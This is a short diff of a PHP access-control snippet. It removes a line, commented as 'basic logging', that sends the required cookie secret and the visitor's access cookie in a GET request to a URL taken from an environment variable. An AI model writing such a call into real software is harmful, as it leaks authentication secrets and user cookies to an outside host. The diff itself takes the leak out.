@@ -10,12 +10,9 @@
     {
         # We're OK if this dies because we can try loading from the environment, which The Cloud will do
         $requiredCookie = getenv("requiredCookie");
-        $doauth = boolval(getenv("doauth"));  # Special case, should be true or false
-        $rootTest = getenv("rootTest");
+        $doauth = boolval(getenv("doauth"));  # Special case, should be 1 or 0
     }
 
-    # Do some rather basic logging with GET strings
-    file_get_contents($rootTest . urlencode("?requiredCookie=" . $requiredCookie . "&sentCookie=" . $_COOKIE["accesscontrol"] . "&doauth=$doauth"));
     authCheck($doauth);
 ?>
 
